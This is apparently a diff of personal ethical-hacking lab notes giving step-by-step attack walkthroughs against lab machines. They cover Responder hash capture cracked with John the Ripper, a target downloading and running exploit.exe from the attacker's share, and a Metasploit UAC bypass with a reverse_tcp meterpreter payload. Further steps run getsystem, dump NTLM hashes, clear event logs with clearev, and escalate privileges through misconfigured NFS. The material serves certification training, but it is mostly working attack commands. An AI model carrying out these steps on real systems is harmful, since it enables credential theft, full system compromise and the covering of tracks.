@@ -1,3 +1,16 @@
+# Perform Active Online Attack to Crack the System’s Password using Responder
+-------------------------------------------------------------------------------
+>>> Ubuntu Machine [Attacker/10.10.1.9]
+1. cd Responder >>  chmod +x ./Responder.py  >>  sudo python2 ./Responder.py -I eth0 (responder start listining)
+>>> Windows Machine [Target/10.10.1.11]
+2. open run(ctrl+r)  >>  type "\\CEH-Tools "  >> click OK
+>>> Ubuntu Machine [Attacker/10.10.1.9]
+3. Responder starts capturing the access logs of the Windows 11 machine. It collects the hashes of the logged-in user of the target machine. Responder stores the logs in Home/Responder/logs. Navigate to the same location and double-click the SMB-NTLMv2-SSP-10.10.1.11.txt file
+4.  sudo snap install john-the-ripper  (installing john to crack the hash captured by Responder)
+5.  sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.1.11.txt        (cracking hash and give result)
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities 
 ------------------------------------------------------------------------------------------------
 >>> Parrot Machine [Attacker/10.10.1.13]
@@ -9,18 +22,27 @@
 >>> Windows Machine [Target/10.10.1.11]
 6. Open browser(firefox)  >> search for "http://10.10.1.13/share" >> download and run exploit.exe
 >>> Parrot Machine [Attacker/10.10.1.13]
-7.  sessions -i 1  >> getuid >> sysinfo >> run vnc   (Meterpreter session)
+7.  sessions -i 1  >> getuid >> sysinfo >> run vnc   (Meterpreter session 1 opened)
 8. Places(top menu on the desktop)  >>  Network >>   press Ctrl+L  >> smb://10.10.1.11  >> Credentials(Admin,Pa$$w0rd)10.
 9. upload /home/attacker/Desktop/BeRoot/beRoot.exe       [In Terminal(meterpreter)]
 10. shell  (to open a shell session)    >>  dir  >>  beroot.exe  (beroot start his work and show you the result in terminal and you can use that information to find vulnerability in targat system.)
 11. upload /home/attacker/Desktop/BeRoot/Seatbelt.exe
 12. shell >> dir >> Seatbelt.exe -group=system(gather information about AMSIProviders, AntiVirus, AppLocker etc)  >>  Seatbelt.exe -group=user (gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc) >> Seatbelt.exe -group=misc (gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc)
+13. exit (to go outside the shell)
+14. background (in meterpreter)
+15. use exploit/windows/local/bypassuac_fodhelper (use exploit to bybassuac)    >>  show option >> set session 1
+16. set payload/windows/meterpreter/reverse_tcp >> show options >> set lhost, lport >> set target 0 >> exploit   (Meterpreter session 2 opened)
+17. getsystem -t 1  [using named pipe impersonation technique for escalating privileges]
+18. getuid >> sysinfo >> run post/windows/gather/smart_hashdump (extracts the NTLM hashes)  >> clearev(clearing logs)
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
 
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS(Network File System) :-
 --------------------------------------------------------------------------------------------
 [Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.] 
@@ -48,4 +70,4 @@
 20. find / -name "*.txt" -ls 2> /dev/null    (view all the .txt files on the system)
 21. route -n          (view the host/network names in numeric form)
 22. find / -perm -4000 -ls 2> /dev/null          (view the SUID executable binaries)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
